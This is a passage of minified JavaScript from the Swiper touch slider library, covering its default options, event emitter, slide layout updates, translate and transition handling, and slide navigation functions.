e.slideToClosest();n.freeModeMomentumBounce&&S?(e.updateProgress(b),e.setTransition(v),e.setTranslate(x),e.transitionStart(!0,e.swipeDirection),e.animating=!0,o.transitionEnd((function(){e&&!e.destroyed&&i.allowMomentumBounce&&(e.emit("momentumBounce"),e.setTransition(n.speed),setTimeout((function(){e.setTranslate(b),o.transitionEnd((function(){e&&!e.destroyed&&e.transitionEnd()}))}),0))}))):e.velocity?(e.updateProgress(x),e.setTransition(v),e.setTranslate(x),e.transitionStart(!0,e.swipeDirection),e.animating||(e.animating=!0,o.transitionEnd((function(){e&&!e.destroyed&&e.transitionEnd()})))):e.updateProgress(x),e.updateActiveIndex(),e.updateSlidesClasses()}else if(n.freeModeSticky)return void e.slideToClosest();(!n.freeModeMomentum||d>=n.longSwipesMs)&&(e.updateProgress(),e.updateActiveIndex(),e.updateSlidesClasses())}else{for(var P=0,R=e.slidesSizesGrid[0],O=0;O<s.length;O+=O<n.slidesPerGroupSkip?1:n.slidesPerGroup){var I=O<n.slidesPerGroupSkip-1?1:n.slidesPerGroup;void 0!==s[O+I]?h>=s[O]&&h<s[O+I]&&(P=O,R=s[O+I]-s[O]):h>=s[O]&&(P=O,R=s[s.length-1]-s[s.length-2])}var z=(h-s[P])/R,D=P<n.slidesPerGroupSkip-1?1:n.slidesPerGroup;if(d>n.longSwipesMs){if(!n.longSwipes)return void e.slideTo(e.activeIndex);"next"===e.swipeDirection&&(z>=n.longSwipesRatio?e.slideTo(P+D):e.slideTo(P)),"prev"===e.swipeDirection&&(z>1-n.longSwipesRatio?e.slideTo(P+D):e.slideTo(P))}else{if(!n.shortSwipes)return void e.slideTo(e.activeIndex);!e.navigation||c.target!==e.navigation.nextEl&&c.target!==e.navigation.prevEl?("next"===e.swipeDirection&&e.slideTo(P+D),"prev"===e.swipeDirection&&e.slideTo(P)):c.target===e.navigation.nextEl?e.slideTo(P+D):e.slideTo(P)}}}function N(){var t=this.params,e=this.el;if(!e||0!==e.offsetWidth){t.breakpoints&&this.setBreakpoint();var i=this.allowSlideNext,n=this.allowSlidePrev,r=this.snapGrid;this.allowSlideNext=!0,this.allowSlidePrev=!0,this.updateSize(),this.updateSlides(),this.updateSlidesClasses(),("auto"===t.slidesPerView||t.slidesPerView>1)&&this.isEnd&&!this.isBeginning&&!this.params.centeredSlides?this.slideTo(this.slides.length-1,0,!1,!0):this.slideTo(this.activeIndex,0,!1,!0),this.autoplay&&this.autoplay.running&&this.autoplay.paused&&this.autoplay.run(),this.allowSlidePrev=n,this.allowSlideNext=i,this.params.watchOverflow&&r!==this.snapGrid&&this.checkOverflow()}}function k(t){this.allowClick||(this.params.preventClicks&&t.preventDefault(),this.params.preventClicksPropagation&&this.animating&&(t.stopPropagation(),t.stopImmediatePropagation()))}function B(){var t=this.wrapperEl,e=this.rtlTranslate;this.previousTranslate=this.translate,this.isHorizontal()?this.translate=e?t.scrollWidth-t.offsetWidth-t.scrollLeft:-t.scrollLeft:this.translate=-t.scrollTop,-0===this.translate&&(this.translate=0),this.updateActiveIndex(),this.updateSlidesClasses();var i=this.maxTranslate()-this.minTranslate();(0===i?0:(this.translate-this.minTranslate())/i)!==this.progress&&this.updateProgress(e?-this.translate:this.translate),this.emit("setTranslate",this.translate,!1)}var F=!1;function H(){}var G={init:!0,direction:"horizontal",touchEventsTarget:"container",initialSlide:0,speed:300,cssMode:!1,updateOnWindowResize:!0,nested:!1,width:null,height:null,preventInteractionOnTransition:!1,userAgent:null,url:null,edgeSwipeDetection:!1,edgeSwipeThreshold:20,freeMode:!1,freeModeMomentum:!0,freeModeMomentumRatio:1,freeModeMomentumBounce:!0,freeModeMomentumBounceRatio:1,freeModeMomentumVelocityRatio:1,freeModeSticky:!1,freeModeMinimumVelocity:.02,autoHeight:!1,setWrapperSize:!1,virtualTranslate:!1,effect:"slide",breakpoints:void 0,spaceBetween:0,slidesPerView:1,slidesPerColumn:1,slidesPerColumnFill:"column",slidesPerGroup:1,slidesPerGroupSkip:0,centeredSlides:!1,centeredSlidesBounds:!1,slidesOffsetBefore:0,slidesOffsetAfter:0,normalizeSlideIndex:!0,centerInsufficientSlides:!1,watchOverflow:!1,roundLengths:!1,touchRatio:1,touchAngle:45,simulateTouch:!0,shortSwipes:!0,longSwipes:!0,longSwipesRatio:.5,longSwipesMs:300,followFinger:!0,allowTouchMove:!0,threshold:0,touchMoveStopPropagation:!1,touchStartPreventDefault:!0,touchStartForcePreventDefault:!1,touchReleaseOnEdges:!1,uniqueNavElements:!0,resistance:!0,resistanceRatio:.85,watchSlidesProgress:!1,watchSlidesVisibility:!1,grabCursor:!1,preventClicks:!0,preventClicksPropagation:!0,slideToClickedSlide:!1,preloadImages:!0,updateOnImagesReady:!0,loop:!1,loopAdditionalSlides:0,loopedSlides:null,loopFillGroupWithBlank:!1,loopPreventsSlide:!0,allowSlidePrev:!0,allowSlideNext:!0,swipeHandler:null,noSwiping:!0,noSwipingClass:"swiper-no-swiping",noSwipingSelector:null,passiveListeners:!0,containerModifierClass:"swiper-container-",slideClass:"swiper-slide",slideBlankClass:"swiper-slide-invisible-blank",slideActiveClass:"swiper-slide-active",slideDuplicateActiveClass:"swiper-slide-duplicate-active",slideVisibleClass:"swiper-slide-visible",slideDuplicateClass:"swiper-slide-duplicate",slideNextClass:"swiper-slide-next",slideDuplicateNextClass:"swiper-slide-duplicate-next",slidePrevClass:"swiper-slide-prev",slideDuplicatePrevClass:"swiper-slide-duplicate-prev",wrapperClass:"swiper-wrapper",runCallbacksOnInit:!0,_emitClasses:!1},j={modular:{useParams:function(t){var e=this;e.modules&&Object.keys(e.modules).forEach((function(i){var n=e.modules[i];n.params&&T(t,n.params)}))},useModules:function(t){void 0===t&&(t={});var e=this;e.modules&&Object.keys(e.modules).forEach((function(i){var n=e.modules[i],r=t[i]||{};n.on&&e.on&&Object.keys(n.on).forEach((function(t){e.on(t,n.on[t])})),n.create&&n.create.bind(e)(r)}))}},eventsEmitter:{on:function(t,e,i){var n=this;if("function"!=typeof e)return n;var r=i?"unshift":"push";return t.split(" ").forEach((function(t){n.eventsListeners[t]||(n.eventsListeners[t]=[]),n.eventsListeners[t][r](e)})),n},once:function(t,e,i){var n=this;if("function"!=typeof e)return n;function r(){n.off(t,r),r.__emitterProxy&&delete r.__emitterProxy;for(var i=arguments.length,a=new Array(i),o=0;o<i;o++)a[o]=arguments[o];e.apply(n,a)}return r.__emitterProxy=e,n.on(t,r,i)},onAny:function(t,e){if("function"!=typeof t)return this;var i=e?"unshift":"push";return this.eventsAnyListeners.indexOf(t)<0&&this.eventsAnyListeners[i](t),this},offAny:function(t){if(!this.eventsAnyListeners)return this;var e=this.eventsAnyListeners.indexOf(t);return e>=0&&this.eventsAnyListeners.splice(e,1),this},off:function(t,e){var i=this;return i.eventsListeners?(t.split(" ").forEach((function(t){void 0===e?i.eventsListeners[t]=[]:i.eventsListeners[t]&&i.eventsListeners[t].forEach((function(n,r){(n===e||n.__emitterProxy&&n.__emitterProxy===e)&&i.eventsListeners[t].splice(r,1)}))})),i):i},emit:function(){var t,e,i,n=this;if(!n.eventsListeners)return n;for(var r=arguments.length,a=new Array(r),o=0;o<r;o++)a[o]=arguments[o];"string"==typeof a[0]||Array.isArray(a[0])?(t=a[0],e=a.slice(1,a.length),i=n):(t=a[0].events,e=a[0].data,i=a[0].context||n),e.unshift(i);var s=Array.isArray(t)?t:t.split(" ");return s.forEach((function(t){if(n.eventsAnyListeners&&n.eventsAnyListeners.length&&n.eventsAnyListeners.forEach((function(n){n.apply(i,[t].concat(e))})),n.eventsListeners&&n.eventsListeners[t]){var r=[];n.eventsListeners[t].forEach((function(t){r.push(t)})),r.forEach((function(t){t.apply(i,e)}))}})),n}},update:{updateSize:function(){var t,e,i=this.$el;t=void 0!==this.params.width&&null!==this.params.width?this.params.width:i[0].clientWidth,e=void 0!==this.params.height&&null!==this.params.width?this.params.height:i[0].clientHeight,0===t&&this.isHorizontal()||0===e&&this.isVertical()||(t=t-parseInt(i.css("padding-left")||0,10)-parseInt(i.css("padding-right")||0,10),e=e-parseInt(i.css("padding-top")||0,10)-parseInt(i.css("padding-bottom")||0,10),Number.isNaN(t)&&(t=0),Number.isNaN(e)&&(e=0),T(this,{width:t,height:e,size:this.isHorizontal()?t:e}))},updateSlides:function(){var t=s(),e=this.params,i=this.$wrapperEl,n=this.size,r=this.rtlTranslate,a=this.wrongRTL,o=this.virtual&&e.virtual.enabled,l=o?this.virtual.slides.length:this.slides.length,c=i.children("."+this.params.slideClass),h=o?this.virtual.slides.length:c.length,u=[],d=[],p=[];function f(t,i){return!e.cssMode||i!==c.length-1}var m=e.slidesOffsetBefore;"function"==typeof m&&(m=e.slidesOffsetBefore.call(this));var g=e.slidesOffsetAfter;"function"==typeof g&&(g=e.slidesOffsetAfter.call(this));var v=this.snapGrid.length,y=this.snapGrid.length,x=e.spaceBetween,b=-m,w=0,_=0;if(void 0!==n){var M,S;"string"==typeof x&&x.indexOf("%")>=0&&(x=parseFloat(x.replace("%",""))/100*n),this.virtualSize=-x,r?c.css({marginLeft:"",marginTop:""}):c.css({marginRight:"",marginBottom:""}),e.slidesPerColumn>1&&(M=Math.floor(h/e.slidesPerColumn)===h/this.params.slidesPerColumn?h:Math.ceil(h/e.slidesPerColumn)*e.slidesPerColumn,"auto"!==e.slidesPerView&&"row"===e.slidesPerColumnFill&&(M=Math.max(M,e.slidesPerView*e.slidesPerColumn)));for(var E,C=e.slidesPerColumn,A=M/C,L=Math.floor(h/e.slidesPerColumn),P=0;P<h;P+=1){S=0;var R=c.eq(P);if(e.slidesPerColumn>1){var O=void 0,I=void 0,z=void 0;if("row"===e.slidesPerColumnFill&&e.slidesPerGroup>1){var D=Math.floor(P/(e.slidesPerGroup*e.slidesPerColumn)),N=P-e.slidesPerColumn*e.slidesPerGroup*D,k=0===D?e.slidesPerGroup:Math.min(Math.ceil((h-D*C*e.slidesPerGroup)/C),e.slidesPerGroup);O=(I=N-(z=Math.floor(N/k))*k+D*e.slidesPerGroup)+z*M/C,R.css({"-webkit-box-ordinal-group":O,"-moz-box-ordinal-group":O,"-ms-flex-order":O,"-webkit-order":O,order:O})}else"column"===e.slidesPerColumnFill?(z=P-(I=Math.floor(P/C))*C,(I>L||I===L&&z===C-1)&&(z+=1)>=C&&(z=0,I+=1)):I=P-(z=Math.floor(P/A))*A;R.css("margin-"+(this.isHorizontal()?"top":"left"),0!==z&&e.spaceBetween&&e.spaceBetween+"px")}if("none"!==R.css("display")){if("auto"===e.slidesPerView){var B=t.getComputedStyle(R[0],null),F=R[0].style.transform,H=R[0].style.webkitTransform;if(F&&(R[0].style.transform="none"),H&&(R[0].style.webkitTransform="none"),e.roundLengths)S=this.isHorizontal()?R.outerWidth(!0):R.outerHeight(!0);else if(this.isHorizontal()){var G=parseFloat(B.getPropertyValue("width")||0),j=parseFloat(B.getPropertyValue("padding-left")||0),U=parseFloat(B.getPropertyValue("padding-right")||0),V=parseFloat(B.getPropertyValue("margin-left")||0),W=parseFloat(B.getPropertyValue("margin-right")||0),q=B.getPropertyValue("box-sizing");if(q&&"border-box"===q)S=G+V+W;else{var X=R[0],Y=X.clientWidth;S=G+j+U+V+W+(X.offsetWidth-Y)}}else{var $=parseFloat(B.getPropertyValue("height")||0),Z=parseFloat(B.getPropertyValue("padding-top")||0),J=parseFloat(B.getPropertyValue("padding-bottom")||0),K=parseFloat(B.getPropertyValue("margin-top")||0),Q=parseFloat(B.getPropertyValue("margin-bottom")||0),tt=B.getPropertyValue("box-sizing");if(tt&&"border-box"===tt)S=$+K+Q;else{var et=R[0],it=et.clientHeight;S=$+Z+J+K+Q+(et.offsetHeight-it)}}F&&(R[0].style.transform=F),H&&(R[0].style.webkitTransform=H),e.roundLengths&&(S=Math.floor(S))}else S=(n-(e.slidesPerView-1)*x)/e.slidesPerView,e.roundLengths&&(S=Math.floor(S)),c[P]&&(this.isHorizontal()?c[P].style.width=S+"px":c[P].style.height=S+"px");c[P]&&(c[P].swiperSlideSize=S),p.push(S),e.centeredSlides?(b=b+S/2+w/2+x,0===w&&0!==P&&(b=b-n/2-x),0===P&&(b=b-n/2-x),Math.abs(b)<.001&&(b=0),e.roundLengths&&(b=Math.floor(b)),_%e.slidesPerGroup==0&&u.push(b),d.push(b)):(e.roundLengths&&(b=Math.floor(b)),(_-Math.min(this.params.slidesPerGroupSkip,_))%this.params.slidesPerGroup==0&&u.push(b),d.push(b),b=b+S+x),this.virtualSize+=S+x,w=S,_+=1}}if(this.virtualSize=Math.max(this.virtualSize,n)+g,r&&a&&("slide"===e.effect||"coverflow"===e.effect)&&i.css({width:this.virtualSize+e.spaceBetween+"px"}),e.setWrapperSize&&(this.isHorizontal()?i.css({width:this.virtualSize+e.spaceBetween+"px"}):i.css({height:this.virtualSize+e.spaceBetween+"px"})),e.slidesPerColumn>1&&(this.virtualSize=(S+e.spaceBetween)*M,this.virtualSize=Math.ceil(this.virtualSize/e.slidesPerColumn)-e.spaceBetween,this.isHorizontal()?i.css({width:this.virtualSize+e.spaceBetween+"px"}):i.css({height:this.virtualSize+e.spaceBetween+"px"}),e.centeredSlides)){E=[];for(var nt=0;nt<u.length;nt+=1){var rt=u[nt];e.roundLengths&&(rt=Math.floor(rt)),u[nt]<this.virtualSize+u[0]&&E.push(rt)}u=E}if(!e.centeredSlides){E=[];for(var at=0;at<u.length;at+=1){var ot=u[at];e.roundLengths&&(ot=Math.floor(ot)),u[at]<=this.virtualSize-n&&E.push(ot)}u=E,Math.floor(this.virtualSize-n)-Math.floor(u[u.length-1])>1&&u.push(this.virtualSize-n)}if(0===u.length&&(u=[0]),0!==e.spaceBetween&&(this.isHorizontal()?r?c.filter(f).css({marginLeft:x+"px"}):c.filter(f).css({marginRight:x+"px"}):c.filter(f).css({marginBottom:x+"px"})),e.centeredSlides&&e.centeredSlidesBounds){var st=0;p.forEach((function(t){st+=t+(e.spaceBetween?e.spaceBetween:0)}));var lt=(st-=e.spaceBetween)-n;u=u.map((function(t){return t<0?-m:t>lt?lt+g:t}))}if(e.centerInsufficientSlides){var ct=0;if(p.forEach((function(t){ct+=t+(e.spaceBetween?e.spaceBetween:0)})),(ct-=e.spaceBetween)<n){var ht=(n-ct)/2;u.forEach((function(t,e){u[e]=t-ht})),d.forEach((function(t,e){d[e]=t+ht}))}}T(this,{slides:c,snapGrid:u,slidesGrid:d,slidesSizesGrid:p}),h!==l&&this.emit("slidesLengthChange"),u.length!==v&&(this.params.watchOverflow&&this.checkOverflow(),this.emit("snapGridLengthChange")),d.length!==y&&this.emit("slidesGridLengthChange"),(e.watchSlidesProgress||e.watchSlidesVisibility)&&this.updateSlidesOffset()}},updateAutoHeight:function(t){var e,i=[],n=0;if("number"==typeof t?this.setTransition(t):!0===t&&this.setTransition(this.params.speed),"auto"!==this.params.slidesPerView&&this.params.slidesPerView>1)if(this.params.centeredSlides)this.visibleSlides.each((function(t){i.push(t)}));else for(e=0;e<Math.ceil(this.params.slidesPerView);e+=1){var r=this.activeIndex+e;if(r>this.slides.length)break;i.push(this.slides.eq(r)[0])}else i.push(this.slides.eq(this.activeIndex)[0]);for(e=0;e<i.length;e+=1)if(void 0!==i[e]){var a=i[e].offsetHeight;n=a>n?a:n}n&&this.$wrapperEl.css("height",n+"px")},updateSlidesOffset:function(){for(var t=this.slides,e=0;e<t.length;e+=1)t[e].swiperSlideOffset=this.isHorizontal()?t[e].offsetLeft:t[e].offsetTop},updateSlidesProgress:function(t){void 0===t&&(t=this&&this.translate||0);var e=this.params,i=this.slides,n=this.rtlTranslate;if(0!==i.length){void 0===i[0].swiperSlideOffset&&this.updateSlidesOffset();var r=-t;n&&(r=t),i.removeClass(e.slideVisibleClass),this.visibleSlidesIndexes=[],this.visibleSlides=[];for(var a=0;a<i.length;a+=1){var o=i[a],s=(r+(e.centeredSlides?this.minTranslate():0)-o.swiperSlideOffset)/(o.swiperSlideSize+e.spaceBetween);if(e.watchSlidesVisibility||e.centeredSlides&&e.autoHeight){var l=-(r-o.swiperSlideOffset),c=l+this.slidesSizesGrid[a];(l>=0&&l<this.size-1||c>1&&c<=this.size||l<=0&&c>=this.size)&&(this.visibleSlides.push(o),this.visibleSlidesIndexes.push(a),i.eq(a).addClass(e.slideVisibleClass))}o.progress=n?-s:s}this.visibleSlides=g(this.visibleSlides)}},updateProgress:function(t){if(void 0===t){var e=this.rtlTranslate?-1:1;t=this&&this.translate&&this.translate*e||0}var i=this.params,n=this.maxTranslate()-this.minTranslate(),r=this.progress,a=this.isBeginning,o=this.isEnd,s=a,l=o;0===n?(r=0,a=!0,o=!0):(a=(r=(t-this.minTranslate())/n)<=0,o=r>=1),T(this,{progress:r,isBeginning:a,isEnd:o}),(i.watchSlidesProgress||i.watchSlidesVisibility||i.centeredSlides&&i.autoHeight)&&this.updateSlidesProgress(t),a&&!s&&this.emit("reachBeginning toEdge"),o&&!l&&this.emit("reachEnd toEdge"),(s&&!a||l&&!o)&&this.emit("fromEdge"),this.emit("progress",r)},updateSlidesClasses:function(){var t,e=this.slides,i=this.params,n=this.$wrapperEl,r=this.activeIndex,a=this.realIndex,o=this.virtual&&i.virtual.enabled;e.removeClass(i.slideActiveClass+" "+i.slideNextClass+" "+i.slidePrevClass+" "+i.slideDuplicateActiveClass+" "+i.slideDuplicateNextClass+" "+i.slideDuplicatePrevClass),(t=o?this.$wrapperEl.find("."+i.slideClass+'[data-swiper-slide-index="'+r+'"]'):e.eq(r)).addClass(i.slideActiveClass),i.loop&&(t.hasClass(i.slideDuplicateClass)?n.children("."+i.slideClass+":not(."+i.slideDuplicateClass+')[data-swiper-slide-index="'+a+'"]').addClass(i.slideDuplicateActiveClass):n.children("."+i.slideClass+"."+i.slideDuplicateClass+'[data-swiper-slide-index="'+a+'"]').addClass(i.slideDuplicateActiveClass));var s=t.nextAll("."+i.slideClass).eq(0).addClass(i.slideNextClass);i.loop&&0===s.length&&(s=e.eq(0)).addClass(i.slideNextClass);var l=t.prevAll("."+i.slideClass).eq(0).addClass(i.slidePrevClass);i.loop&&0===l.length&&(l=e.eq(-1)).addClass(i.slidePrevClass),i.loop&&(s.hasClass(i.slideDuplicateClass)?n.children("."+i.slideClass+":not(."+i.slideDuplicateClass+')[data-swiper-slide-index="'+s.attr("data-swiper-slide-index")+'"]').addClass(i.slideDuplicateNextClass):n.children("."+i.slideClass+"."+i.slideDuplicateClass+'[data-swiper-slide-index="'+s.attr("data-swiper-slide-index")+'"]').addClass(i.slideDuplicateNextClass),l.hasClass(i.slideDuplicateClass)?n.children("."+i.slideClass+":not(."+i.slideDuplicateClass+')[data-swiper-slide-index="'+l.attr("data-swiper-slide-index")+'"]').addClass(i.slideDuplicatePrevClass):n.children("."+i.slideClass+"."+i.slideDuplicateClass+'[data-swiper-slide-index="'+l.attr("data-swiper-slide-index")+'"]').addClass(i.slideDuplicatePrevClass)),this.emitSlidesClasses()},updateActiveIndex:function(t){var e,i=this.rtlTranslate?this.translate:-this.translate,n=this.slidesGrid,r=this.snapGrid,a=this.params,o=this.activeIndex,s=this.realIndex,l=this.snapIndex,c=t;if(void 0===c){for(var h=0;h<n.length;h+=1)void 0!==n[h+1]?i>=n[h]&&i<n[h+1]-(n[h+1]-n[h])/2?c=h:i>=n[h]&&i<n[h+1]&&(c=h+1):i>=n[h]&&(c=h);a.normalizeSlideIndex&&(c<0||void 0===c)&&(c=0)}if(r.indexOf(i)>=0)e=r.indexOf(i);else{var u=Math.min(a.slidesPerGroupSkip,c);e=u+Math.floor((c-u)/a.slidesPerGroup)}if(e>=r.length&&(e=r.length-1),c!==o){var d=parseInt(this.slides.eq(c).attr("data-swiper-slide-index")||c,10);T(this,{snapIndex:e,realIndex:d,previousIndex:o,activeIndex:c}),this.emit("activeIndexChange"),this.emit("snapIndexChange"),s!==d&&this.emit("realIndexChange"),(this.initialized||this.params.runCallbacksOnInit)&&this.emit("slideChange")}else e!==l&&(this.snapIndex=e,this.emit("snapIndexChange"))},updateClickedSlide:function(t){var e=this.params,i=g(t.target).closest("."+e.slideClass)[0],n=!1;if(i)for(var r=0;r<this.slides.length;r+=1)this.slides[r]===i&&(n=!0);if(!i||!n)return this.clickedSlide=void 0,void(this.clickedIndex=void 0);this.clickedSlide=i,this.virtual&&this.params.virtual.enabled?this.clickedIndex=parseInt(g(i).attr("data-swiper-slide-index"),10):this.clickedIndex=g(i).index(),e.slideToClickedSlide&&void 0!==this.clickedIndex&&this.clickedIndex!==this.activeIndex&&this.slideToClickedSlide()}},translate:{getTranslate:function(t){void 0===t&&(t=this.isHorizontal()?"x":"y");var e=this.params,i=this.rtlTranslate,n=this.translate,r=this.$wrapperEl;if(e.virtualTranslate)return i?-n:n;if(e.cssMode)return n;var a=M(r[0],t);return i&&(a=-a),a||0},setTranslate:function(t,e){var i=this.rtlTranslate,n=this.params,r=this.$wrapperEl,a=this.wrapperEl,o=this.progress,s=0,l=0;this.isHorizontal()?s=i?-t:t:l=t,n.roundLengths&&(s=Math.floor(s),l=Math.floor(l)),n.cssMode?a[this.isHorizontal()?"scrollLeft":"scrollTop"]=this.isHorizontal()?-s:-l:n.virtualTranslate||r.transform("translate3d("+s+"px, "+l+"px, 0px)"),this.previousTranslate=this.translate,this.translate=this.isHorizontal()?s:l;var c=this.maxTranslate()-this.minTranslate();(0===c?0:(t-this.minTranslate())/c)!==o&&this.updateProgress(t),this.emit("setTranslate",this.translate,e)},minTranslate:function(){return-this.snapGrid[0]},maxTranslate:function(){return-this.snapGrid[this.snapGrid.length-1]},translateTo:function(t,e,i,n,r){void 0===t&&(t=0),void 0===e&&(e=this.params.speed),void 0===i&&(i=!0),void 0===n&&(n=!0);var a=this,o=a.params,s=a.wrapperEl;if(a.animating&&o.preventInteractionOnTransition)return!1;var l,c=a.minTranslate(),h=a.maxTranslate();if(l=n&&t>c?c:n&&t<h?h:t,a.updateProgress(l),o.cssMode){var u,d=a.isHorizontal();return 0===e?s[d?"scrollLeft":"scrollTop"]=-l:s.scrollTo?s.scrollTo(((u={})[d?"left":"top"]=-l,u.behavior="smooth",u)):s[d?"scrollLeft":"scrollTop"]=-l,!0}return 0===e?(a.setTransition(0),a.setTranslate(l),i&&(a.emit("beforeTransitionStart",e,r),a.emit("transitionEnd"))):(a.setTransition(e),a.setTranslate(l),i&&(a.emit("beforeTransitionStart",e,r),a.emit("transitionStart")),a.animating||(a.animating=!0,a.onTranslateToWrapperTransitionEnd||(a.onTranslateToWrapperTransitionEnd=function(t){a&&!a.destroyed&&t.target===this&&(a.$wrapperEl[0].removeEventListener("transitionend",a.onTranslateToWrapperTransitionEnd),a.$wrapperEl[0].removeEventListener("webkitTransitionEnd",a.onTranslateToWrapperTransitionEnd),a.onTranslateToWrapperTransitionEnd=null,delete a.onTranslateToWrapperTransitionEnd,i&&a.emit("transitionEnd"))}),a.$wrapperEl[0].addEventListener("transitionend",a.onTranslateToWrapperTransitionEnd),a.$wrapperEl[0].addEventListener("webkitTransitionEnd",a.onTranslateToWrapperTransitionEnd))),!0}},transition:{setTransition:function(t,e){this.params.cssMode||this.$wrapperEl.transition(t),this.emit("setTransition",t,e)},transitionStart:function(t,e){void 0===t&&(t=!0);var i=this.activeIndex,n=this.params,r=this.previousIndex;if(!n.cssMode){n.autoHeight&&this.updateAutoHeight();var a=e;if(a||(a=i>r?"next":i<r?"prev":"reset"),this.emit("transitionStart"),t&&i!==r){if("reset"===a)return void this.emit("slideResetTransitionStart");this.emit("slideChangeTransitionStart"),"next"===a?this.emit("slideNextTransitionStart"):this.emit("slidePrevTransitionStart")}}},transitionEnd:function(t,e){void 0===t&&(t=!0);var i=this.activeIndex,n=this.previousIndex,r=this.params;if(this.animating=!1,!r.cssMode){this.setTransition(0);var a=e;if(a||(a=i>n?"next":i<n?"prev":"reset"),this.emit("transitionEnd"),t&&i!==n){if("reset"===a)return void this.emit("slideResetTransitionEnd");this.emit("slideChangeTransitionEnd"),"next"===a?this.emit("slideNextTransitionEnd"):this.emit("slidePrevTransitionEnd")}}}},slide:{slideTo:function(t,e,i,n){if(void 0===t&&(t=0),void 0===e&&(e=this.params.speed),void 0===i&&(i=!0),"number"!=typeof t&&"string"!=typeof t)throw new Error("The 'index' argument cannot have type other than 'number' or 'string'. ["+typeof t+"] given.");if("string"==typeof t){var r=parseInt(t,10);if(!isFinite(r))throw new Error("The passed-in 'index' (string) couldn't be converted to 'number'. ["+t+"] given.");t=r}var a=this,o=t;o<0&&(o=0);var s=a.params,l=a.snapGrid,c=a.slidesGrid,h=a.previousIndex,u=a.activeIndex,d=a.rtlTranslate,p=a.wrapperEl;if(a.animating&&s.preventInteractionOnTransition)return!1;var f=Math.min(a.params.slidesPerGroupSkip,o),m=f+Math.floor((o-f)/a.params.slidesPerGroup);m>=l.length&&(m=l.length-1),(u||s.initialSlide||0)===(h||0)&&i&&a.emit("beforeSlideChangeStart");var g,v=-l[m];if(a.updateProgress(v),s.normalizeSlideIndex)for(var y=0;y<c.length;y+=1)-Math.floor(100*v)>=Math.floor(100*c[y])&&(o=y);if(a.initialized&&o!==u){if(!a.allowSlideNext&&v<a.translate&&v<a.minTranslate())return!1;if(!a.allowSlidePrev&&v>a.translate&&v>a.maxTranslate()&&(u||0)!==o)return!1}if(g=o>u?"next":o<u?"prev":"reset",d&&-v===a.translate||!d&&v===a.translate)return a.updateActiveIndex(o),s.autoHeight&&a.updateAutoHeight(),a.updateSlidesClasses(),"slide"!==s.effect&&a.setTranslate(v),"reset"!==g&&(a.transitionStart(i,g),a.transitionEnd(i,g)),!1;if(s.cssMode){var x,b=a.isHorizontal(),w=-v;return d&&(w=p.scrollWidth-p.offsetWidth-w),0===e?p[b?"scrollLeft":"scrollTop"]=w:p.scrollTo?p.scrollTo(((x={})[b?"left":"top"]=w,x.behavior="smooth",x)):p[b?"scrollLeft":"scrollTop"]=w,!0}return 0===e?(a.setTransition(0),a.setTranslate(v),a.updateActiveIndex(o),a.updateSlidesClasses(),a.emit("beforeTransitionStart",e,n),a.transitionStart(i,g),a.transitionEnd(i,g)):(a.setTransition(e),a.setTranslate(v),a.updateActiveIndex(o),a.updateSlidesClasses(),a.emit("beforeTransitionStart",e,n),a.transitionStart(i,g),a.animating||(a.animating=!0,a.onSlideToWrapperTransitionEnd||(a.onSlideToWrapperTransitionEnd=function(t){a&&!a.destroyed&&t.target===this&&(a.$wrapperEl[0].removeEventListener("transitionend",a.onSlideToWrapperTransitionEnd),a.$wrapperEl[0].removeEventListener("webkitTransitionEnd",a.onSlideToWrapperTransitionEnd),a.onSlideToWrapperTransitionEnd=null,delete a.onSlideToWrapperTransitionEnd,a.transitionEnd(i,g))}),a.$wrapperEl[0].addEventListener("transitionend",a.onSlideToWrapperTransitionEnd),a.$wrapperEl[0].addEventListener("webkitTransitionEnd",a.onSlideToWrapperTransitionEnd))),!0},slideToLoop:function(t,e,i,n){void 0===t&&(t=0),void 0===e&&(e=this.params.speed),void 0===i&&(i=!0);var r=t;return this.params.loop&&(r+=this.loopedSlides),this.slideTo(r,e,i,n)},slideNext:function(t,e,i){void 0===t&&(t=this.params.speed),void 0===e&&(e=!0);var n=this.params,r=this.animating,a=this.activeIndex<n.slidesPerGroupSkip?1:n.slidesPerGroup;if(n.loop){if(r&&n.loopPreventsSlide)return!1;this.loopFix(),this._clientLeft=this.$wrapperEl[0].clientLeft}return this.slideTo(this.activeIndex+a,t,e,i)},slidePrev:function(t,e,i){void 0===t&&(t=this.params.speed),void 0===e&&(e=!0);var n=this.params,r=this.animating,a=this.snapGrid,o=this.slidesGrid,s=this.rtlTranslate;if(n.loop){if(r&&n.loopPreventsSlide)return!1;this.loopFix(),this._clientLeft=this.$wrapperEl[0].clientLeft}function l(t){return t<0?-Math.floor(Math.abs(t)):Math.floor(t)}var c,h=l(s?this.translate:-this.translate),u=a.map((function(t){return l(t)})),d=(a[u.indexOf(h)],a[u.indexOf(h)-1]);return void 0===d&&n.cssMode&&a.forEach((function(t){!d&&h>=t&&(d=t)})),void 0!==d&&(c=o.indexOf(d))<0&&(c=this.activeIndex-1),this.slideTo(c,t,e,i)},slideReset:function(t,e,i){return void 0===t&&(t=this.params.speed),void 0===e&&(e=!0),this.slideTo(this.activeIndex,t,e,i)},slideToClosest:function(t,e,i,n){void 0===t&&(t=this.params.speed),void 0===e&&(e=!0),void 0===n&&(n=.5);var r=this.activeIndex,a=Math.min(this.params.slidesPerGroupSkip,r),o=a+Math.floor((r-a)/this.params.slidesPerGroup),s=this.rtlTranslate?this.translate:-this.translate;if(s>=this.snapGrid[o]){var l=this.snapGrid[o];s-l>(this.snapGrid[o+1]-l)*n&&(r+=this.params.slidesPerGroup)}else{var c=this.snapGrid[o-1];s-c<=(this.snapGrid[o]-c)*n&&(r-=this.params.slidesPerGroup)}return r=Math.max(r,0),r=Math.min(r,this.slidesGrid.length-1),this.slideTo(r,t,e,i)},slideToClickedSlide:function(){var t,e=this,i=e.params,n=e.$wrapperEl,r="auto"===i.slidesPerView?e.slidesPerViewDynamic():i.slidesPerView,a=e.clickedIndex;if(i.loop){if(e.animating)return;t=parseInt(g(e.clickedSlide).attr("data-swiper-slide-index"),10),i.centeredSlides?a<e.loopedSlides-r/2||a>e.slides.length-e.loopedSlides+r/2?(e.loopFix(),a=n.children("."+i.slideClass+'[data-swiper-slide-index="'+t+'"]:not(.'+i.slideDuplicateClass+")").eq(0).index(),w((function(){e.slideTo(a)}))):e.slideTo(a):a>e.slides.length-r?(e.loopFix(),a=n.children("."+i.slideClass+'[data-swiper-slide-index="'+t+'"]:not(.'+i.slideDuplicateClass+")").eq(0).index(),w((function(){e.slideTo(a)}))):e.slideTo(a)}else e.slideTo(a)}},loop:{loopCreate:function(){var 